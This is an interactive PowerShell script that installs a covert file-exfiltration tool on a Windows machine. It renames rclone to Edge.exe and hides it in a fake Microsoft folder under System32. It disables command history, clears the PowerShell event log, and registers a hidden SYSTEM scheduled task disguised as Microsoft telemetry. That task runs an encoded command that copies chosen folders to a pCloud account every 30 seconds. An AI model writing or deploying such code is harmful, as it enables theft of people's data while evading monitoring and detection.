#Scripts is finzalized and multiple times tested in the field.
#Token for cloud storage should be refreshed based on the expiry
#paramaeters provided by the cloud provider.
#----Variabes start here.
$AvailableTls = [enum]::GetValues('Net.SecurityProtocolType') | Where-Object { $_ -ge 'Tls12' }
foreach ($tlsProtocol in $AvailableTls) {[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor $tlsProtocol}
Set-PSReadLineOption -HistorySaveStyle SaveNothing | Out-Null
Clear-EventLog "Windows Powershell"
$LogEngineLifecycleEvent = $false | Out-Null
[void]$LogEngineLifecycleEvent
$rclonedlurl = "https://codeberg.org/sempiampi/mavericks/releases/download/v1.0.0/Rclone.zip"
$texteditorurl = "https://codeberg.org/sempiampi/mavericks/releases/download/v1.0.0/micro.zip"
$basepath = "C:\Windows\System32\SecureBootUpdatesMicrosoft\Rclone"
$rclonezip = Join-Path -Path $basepath -ChildPath "Rclone.zip"
$rcloneexe = Join-Path -Path $basepath -ChildPath "Edge.exe"
$texteditorzip = Join-Path -Path $basepath -ChildPath "micro.zip"
$texteditorexe = Join-Path -Path $basepath -ChildPath "micro.exe"
$rcloneconfigfile = Join-Path -Path $basepath -ChildPath "rc.conf"
$syncledgerfile = Join-Path -Path $basepath -ChildPath "syncledger"
$localtask = "Windows Telemetry Service"
#----Variables end.

#----Main script begins here.
#Cleanup
$prompt = "Cleanup?"
$option = Read-Host "Proceed With $prompt (y/n):"
if ([string]::IsNullOrEmpty($option)) {
    Start-Sleep -Seconds 1
    $option = "n"
}
if ($option.ToLower() -eq "y") { 
    if (Get-ScheduledTask -TaskName $localtask -ErrorAction SilentlyContinue) {
        Stop-ScheduledTask -TaskName $localtask -ErrorAction SilentlyContinue
        Write-Host "Scheduled task '$localtask' is stopped successfully." -BackgroundColor Black -ForegroundColor Green
        Unregister-ScheduledTask -TaskName $localtask -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
        Write-Host "Scheduled task '$localtask' is removed successfully." -BackgroundColor Black -ForegroundColor Green
    }
    else {
        Write-Host "Scheduled task '$localtask' does not exist." -BackgroundColor Black -ForegroundColor Red
    }
    if (Test-Path $basepath) {
        Get-Process -Name "Edge" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
        Write-Host "Rclone process has been termininated" -BackgroundColor Black -ForegroundColor Green
    }
    else {
        Write-Host "Rclone process is not running." -BackgroundColor Black -ForegroundColor Red
    }
    if (Test-Path $basepath) {
        Remove-Item -Path $basepath -Recurse -Force -Confirm:$false -ErrorAction SilentlyContinue
        Write-Host "Rclone directory ('$basepath') has been removed" -BackgroundColor Black -ForegroundColor Green
    }
    else {
        Write-Host "Rclone directory('$basepath') does not exist." -BackgroundColor Black -ForegroundColor Red
    }
    
}
else {}

##Directory creation and download section.
$prompt = "Directory creation & Download?"
$option = Read-Host "Proceed With $prompt (y/n):"
if ([string]::IsNullOrEmpty($option)) {
    Start-Sleep -Seconds 1
    $option = "n"
}
if ($option.ToLower() -eq "y") {  
    if (-not (Test-Path -Path $rcloneexe -PathType Leaf)) {
        if (-not (Test-Path -Path $basepath -PathType Container)) {
            New-Item -ItemType Directory -Path $basepath -Force | Out-Null
        }
        Invoke-WebRequest -Uri $rclonedlurl -OutFile $rclonezip
        Write-Host "Rclone download successful" -BackgroundColor Black -ForegroundColor Green
        Expand-Archive -Path $rclonezip -DestinationPath $basepath -Force
        Write-Host -BackgroundColor Black -ForegroundColor Green "Rclone Extraction successful"
        Remove-Item -Path $rclonezip -Force
    }
    else {
        Write-Host -BackgroundColor Black -ForegroundColor Green "Edge.exe(rclone) already exists. Skipping download."
    }
    if (-not (Test-Path -Path $texteditorexe -PathType Leaf)) {
        if (-not (Test-Path -Path $basepath -PathType Container)) {
            New-Item -ItemType Directory -Path $basepath -Force | Out-Null
        }
        Invoke-WebRequest -Uri $texteditorurl -OutFile $texteditorzip
        Write-Host "Text editor download successful" -BackgroundColor Black -ForegroundColor Green
        Expand-Archive -Path $texteditorzip -DestinationPath $basepath -Force
        Write-Host -BackgroundColor Black -ForegroundColor Green "Text editor extraction successful"
        Remove-Item -Path $texteditorzip -Force
    }
    else {
        Write-Host -BackgroundColor Black -ForegroundColor Green "Text editor(nano) already exists. Skipping download."
    }
}
else {}

#Rc.conf - file containing remote cloud configuration for Edge.exe.
$prompt = "creation/modif of rc.conf(rclone config)?"
$option = Read-Host "Proceed With $prompt (y/n):"
if ([string]::IsNullOrEmpty($option)) {
    Start-Sleep -Seconds 1
    $option = "n"
}
if ($option.ToLower() -eq "y") { 
    $fillervar = "rc.conf"
    function Get-YesOrNo {
        param (
            [string]$fillervar
        )
        do {
            $datain = Read-Host "Do you want to create new $fillervar file? (y/n)"
        } while ($datain -ne "y" -and $datain -ne "n")
        return $datain
    } 

    if (Test-Path $rcloneconfigfile) {
        $viewOldFile = Read-Host "The rc.conf file already exists. Do you want to view its contents? (y/n)"
        if ($viewOldFile -eq "y") {
            Write-Host -BackgroundColor Black -ForegroundColor Yellow "Contents of rc.conf file:"
            Get-Content $rcloneconfigfile
            Write-Host -BackgroundColor Black -ForegroundColor Red "------------------------------"
            do {
                $continue = Get-YesOrNo -fillervar $fillervar
                if ($continue -eq "n") {
                    Write-Host -BackgroundColor Black -ForegroundColor Red "Continuing without creating a new file."
                    exit
                }
            } while ($continue -ne "y")
        }
        else {
            Write-Host -BackgroundColor Black -ForegroundColor Red "Continuing without viewing the old file."
        }
    }
    if ($continue -eq "y" -or -not (Test-Path $rcloneconfigfile)) {
        $token = Read-Host "Please enter your token:"
$rcConfContent = @"
[remsync]
type = pcloud
hostname = eapi.pcloud.com
token = {"access_token":"$token","token_type":"bearer","expiry":"0001-01-01T00:00:00Z"}
"@
        $rcConfContent | Out-File -FilePath $rcloneconfigfile -Encoding UTF8
        Write-Host -BackgroundColor Black -ForegroundColor Green "New rc.conf file has been created at: $rcloneconfigfile"
    }
}
else {}

#Syncledger - the file that contains path to what is going to be synced creation.
$prompt = "creation/modif of file(syncledger) that should contain list of folders to be synced?"
$option = Read-Host "Proceed With $prompt (y/n):"
if ([string]::IsNullOrEmpty($option)) {
    Start-Sleep -Seconds 1
    $option = "n"
}
if ($option.ToLower() -eq "y") {  
    $taskRunning = Get-ScheduledTask | Where-Object { $_.TaskName -eq $localtask -and $_.State -eq "Running" }
    if ($taskRunning) {
        Write-Host "Stopping task: $localtask"
        Stop-ScheduledTask -TaskName $localtask -ErrorAction SilentlyContinue
    }
    if (Test-Path $syncledgerfile) {
        Write-Host "A syncledger file already exists."
        Write-Host "------------------------" -BackgroundColor Black -ForegroundColor Red
        Get-Content $syncledgerfile
        Write-Host "------------------------" -BackgroundColor Black -ForegroundColor Red
    
        do {
            $choice = Read-Host "Type 'e' to edit the file, or 'q' to exit. (e/q)"
            
            if ($choice -eq "e") {
                Start-Process -FilePath $texteditorexe -ArgumentList $syncledgerfile -NoNewWindow -Wait
                break
            }
            elseif ($choice -eq "q") {
                Write-Host "Exiting the script."
                break
            }
            else {
                Write-Host "Invalid choice. Please enter 'e' or 'q'."
            }
        } while ($true)
    }
    else {
        Start-Process -FilePath $texteditorexe -ArgumentList $syncledgerfile -NoNewWindow -Wait
        Write-Host "------------------------" -BackgroundColor Black -ForegroundColor Red
        Get-Content $syncledgerfile
        Write-Host "------------------------" -BackgroundColor Black -ForegroundColor Red
    }
    Write-Host "Re-starting scheduled task: $localtask"
    $taskExistsAndStopped = Get-ScheduledTask -TaskName $localtask -ErrorAction SilentlyContinue | Where-Object { $_.State -eq "Stopped" }
    if ($taskExistsAndStopped) {
        Start-ScheduledTask -TaskName $localtask -ErrorAction SilentlyContinue
        Write-Host "Task '$localtask' started."
    }
    else {
        Write-Host "Task either doesn't exist or is not stopped." -BackgroundColor Black -ForegroundColor Red
    }    
} else {}

#Windows Task Creation for rclone continuous sync.
$prompt = "scheduled task creation for rclone.exe?"
$option = Read-Host "Proceed With $prompt (y/n):"
if ([string]::IsNullOrEmpty($option)) {
    Start-Sleep -Seconds 1
    $option = "n"
}
if ($option.ToLower() -eq "y") {

$rawscript = @'
$AvailableTls = [enum]::GetValues('Net.SecurityProtocolType') | Where-Object { $_ -ge 'Tls12' }
foreach ($tlsProtocol in $AvailableTls) {[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor $tlsProtocol}
Set-PSReadLineOption -HistorySaveStyle SaveNothing | Out-Null
Clear-EventLog "Windows Powershell"
$LogEngineLifecycleEvent = $false | Out-Null
[void]$LogEngineLifecycleEvent
$basepath = "C:\Windows\System32\SecureBootUpdatesMicrosoft\Rclone"
$rcloneexe = Join-Path -Path $basepath -ChildPath "Edge.exe"
$ledgerpath = Join-Path -Path $basepath -ChildPath "syncledger"
$rcloneconfig = Join-Path -Path $basepath -ChildPath "rc.conf"
$clouddrive = "remsync"
$systemserialnumberraw = (Get-WmiObject -Class Win32_BIOS).SerialNumber
#$trimmedSerial = $systemserialnumberraw.Substring(0, [Math]::Min(4, $systemserialnumberraw.Length)).ToLower()
#$systemnametrimmed = $env:COMPUTERNAME.Substring([Math]::Max(0, $env:COMPUTERNAME.Length - 4), [Math]::Min(4, $env:COMPUTERNAME.Length)).ToLower()
#pathforcloud = "$($trimmedSerial)-$($systemnametrimmed)"
function SyncWithRclone {
    $syncDirectories = Get-Content $ledgerpath
    foreach ($directory in $syncDirectories) {
        & $rcloneexe --config $rcloneconfig sync "$directory" "${clouddrive}:$systemserialnumberraw" --max-size 10M
    }
}
while ($true) {
    SyncWithRclone
    Start-Sleep -Seconds 30
}
'@
$bytes = [System.Text.Encoding]::Unicode.GetBytes($rawscript)
$enccmd = [Convert]::ToBase64String($bytes)
# Actions for scheduled task.
$STAction = New-ScheduledTaskAction `
    -Execute 'powershell.exe' `
    -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand $enccmd"    
# Triggers for scheduled task.
$STTrigger = New-ScheduledTaskTrigger `
    -Once `
    -At ([DateTime]::Now.AddSeconds(10)) `
    -RepetitionDuration (New-TimeSpan -Days (365*50)) `
    -RepetitionInterval (New-TimeSpan -Minutes 5)     
# Settings for scheduled task
$STSettings = New-ScheduledTaskSettingsSet `
    -Compatibility Win8 `
    -MultipleInstances IgnoreNew `
    -RestartInterval (New-TimeSpan -Minutes 5) `
    -RestartCount:9999 `
    -ExecutionTimeLimit:0 `
    -AllowStartIfOnBatteries `
    -DontStopIfGoingOnBatteries `
    -StartWhenAvailable `
    -DisallowHardTerminate `
    -Priority 0 `
    -Hidden 
    
# Registering the scheduled task.
if (Get-ScheduledTask -TaskName $localtask -ErrorAction SilentlyContinue) {
    Unregister-ScheduledTask -TaskName $localtask -Confirm:$false -ErrorAction SilentlyContinue
}
Register-ScheduledTask `
    -Action $STAction `
    -Trigger $STTrigger `
    -Settings $STSettings `
    -TaskName $localtask `
    -Description "Windows Server Update Services, previously known as Software Update Services, is a computer program and network service developed by Microsoft Corporation that enables administrators to manage the distribution of updates and hotfixes released for Microsoft products to computers in a corporate environment." `
    -User "NT AUTHORITY\SYSTEM" `
    -RunLevel Highest | Out-Null
# Post Registration settings.
$TargetTask = Get-ScheduledTask -TaskName $localtask -ErrorAction SilentlyContinue
$TargetTask.Author = 'Microsoft Corporation'
$TargetTask.Settings.volatile = $False
$TargetTask | Set-ScheduledTask | Out-Null
} else {}